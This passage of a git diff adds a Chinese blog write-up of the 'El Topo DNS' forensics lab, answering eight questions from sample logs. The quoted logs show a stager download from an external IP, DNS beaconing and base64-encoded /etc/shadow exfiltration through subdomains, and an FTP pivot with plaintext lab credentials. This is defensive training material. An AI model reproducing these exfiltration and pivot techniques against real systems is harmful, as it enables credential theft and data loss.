@@ -2148,3 +2148,129 @@ root.txt
 c3ab266a11de0294257eaef357??????
 ```
 
+> 最近老忙了哎，断更好久了呢，哈哈，没办法，我还是个苦逼大学牲呢，比赛、考试连轴转
+
+## El Topo DNS
+> **提示:** 靶机跳转传送门
+[El Topo DNS](https://labs.thehackerslabs.com/machines/146)
+
+<img src="/assets/img/thehackerslabs-notes/EITOPODNS.png" alt="El Topo DNS" style="zoom:50%;" />
+
+
+靶机渗透打多了，来瞅瞅蓝队溯源吧
+
+哈哈，西班牙语真难懂啊，我接下来的题目内容，我以ai描述的为准
+
+### 问题一
+
+> **¿Qué dirección IP externa sirvió el \*stager\* `p.sh` al servidor web?**
+> （哪个外部 IP 地址向 Web 服务器提供了 `p.sh` 这个 stager？）
+
+这题好解决，按照题目意思，这显然已经传成功了，那么我在access.log日志中就能查到p.sh才对
+
+```bash
+auditor@debian:~/dfir_eltopo$ grep -i "p\.sh" access.log
+192.168.1.10 - - [10/nov/2025:09:10:13 +0100] "GET http://162.248.1.100/p.sh HTTP/1.1" 200 1024
+```
+
+所以答案是`162.248.1.100`
+
+### 问题二
+
+> **¿Qué fichero PHP (solo nombre) fue el punto de entrada más probable de la explotación inicial?**
+> （哪个 PHP 文件（仅文件名）最有可能是初始攻击的入口点？）
+
+这里显然需要找到上传🐎的入口文件，在我看来，先统计下所有的php文件出现频率，就能找到可疑文件名了
+
+```BASH
+auditor@debian:~/dfir_eltopo$ awk '$7 ~ /\.php$/ {print $7}' access.log | sort | uniq -c | sort -nr
+   1211 /contact.php
+      1 /upload.php
+```
+
+这里的upload.php有很大概率是攻击者试探的文件
+
+答案就是upload.php
+
+### 问题三
+
+> **¿Cuál es el FQDN de la primera consulta de \*beaconing\* de C2 observada en los logs?**
+> （在日志中观察到的、第一次 C2 **心跳信标**（beaconing）查询的**完整域名**（FQDN）是什么？）
+
+开始考察域名解析了，需要我去dns日志里面看
+
+一般来说，恶意域名的子域名可能会用长编码表示
+
+<img src="/assets/img/thehackerslabs-notes/image-20251119222253645.png" alt="image-20251119222253645" style="zoom:50%;" />
+
+就像图片显示的这样，我们接下来应该关注主域名eltopo.thl，前面是子域名，可能会变换
+
+```bash
+auditor@debian:~/dfir_eltopo$ grep -i "eltopo.thl" dns.log
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? 1.beacon.c2.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? OTk5Ojc6OjoK.data.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? 2.beacon.c2.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? 3.beacon.c2.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? Oio6MTgwMDA6MDo5OTk5OTo3Ojo6CmRhZW1vbjoqOjE4MDAwOjA6OTk5OTk6.data.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? Nzo6OgpkZXZ1c2VyOiQ2JHJvdW5kcz02NTYwMDAkYWJjZGVmZyRoaWprbG1u.data.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? cm9vdDokNiRzYWx0eSRULlVWcy4uLjoxODAwMDowOjk5OTk5Ojc6OjoKYmlu.data.eltopo.thl
+[2025-11-10T09:10:13] 192.168.1.10 -> DNS_SERVER Query: A? b3AuLi46MTgwMDE6MDo5OTk5OTo3Ojo6CmZ0cHVzZXI6KjoxODAwMTowOjk5.data.eltopo.thl
+```
+
+第一条记录中的完整域名就是要提交的答案
+
+### 问题四
+
+> **¿Cuál es el dominio (solo el dominio, sin subdominios de datos) usado para exfiltrar el fichero shadow?**
+> （用于窃取 `/etc/shadow` 文件的**域名**是什么？**仅域名，不含数据子域**）
+
+这个问题我们在上一问就解答了，将后面的base64解密，就能看到shadow文件的部分内容
+
+所以答案就是`eltopo.thl`
+
+不是，平台上为啥报错，加上data就通过了，可是这里的data明明是数据子域啊
+
+### 问题五
+
+> **¿Qué servicio de red (protocolo) usó el atacante para pivotar al servidor interno 10.0.0.50?**
+> （攻击者使用了哪种**网络服务（协议）** 来横向移动到内部服务器 `10.0.0.50`？）
+
+横向移动的方法很多，就目前而言，我接触过的有SSH,SMB,FTP,MySQL.HTTP等等，正好这里题目下发了ftp.log文件
+
+直接提交通过
+
+### 问题六
+
+> **¿Qué nombre de usuario se utilizó para autenticarse en el servidor interno?**
+> （攻击者使用了什么**用户名**来认证内网服务器？）
+
+```bash
+auditor@debian:~/dfir_eltopo$ cat ftp.log
+[09:10:13] 192.168.1.10 -> 10.0.0.50 FTP 220 (vsFTPd 3.0.3)
+[09:10:13] 192.168.1.10 -> 10.0.0.50 FTP USER devuser
+[09:10:13] 10.0.0.50 -> 192.168.1.10 FTP 331 Please specify the password.
+[09:10:13] 192.168.1.10 -> 10.0.0.50 FTP PASS developer123
+[09:10:13] 10.0.0.50 -> 192.168.1.10 FTP 230 Login successful.
+[09:10:13] 192.168.1.10 -> 10.0.0.50 FTP LIST
+[09:10:13] 10.0.0.50 -> 192.168.1.10 FTP 226 Directory send OK.
+[09:10:13] 192.168.1.10 -> 10.0.0.50 FTP GET client_database_backup.zip
+[09:10:13] 10.0.0.50 -> 192.168.1.10 FTP 150 Opening BINARY mode data connection.
+[09:10:13] 10.0.0.50 -> 192.168.1.10 FTP 226 Transfer complete.
+auditor@debian:~/dfir_eltopo$ 
+```
+
+直接看log，用到的用户是`devuser`，对应的password也有，是`developer123`
+
+### 问题七
+
+> **¿Qué contraseña se utilizó para el movimiento lateral exitoso?**
+> （攻击者进行**成功横向移动**时使用的**密码**是什么？）
+
+上一个问题就解答了的
+
+### 问题八
+
+> **¿Cuál es el nombre de fichero exacto que el atacante robó del servidor interno?**
+> （攻击者从内网服务器**窃取的文件的完整准确文件名**是什么？）
+
+还是在问题六中，攻击者ftp登录上去get了`client_database_backup.zip`
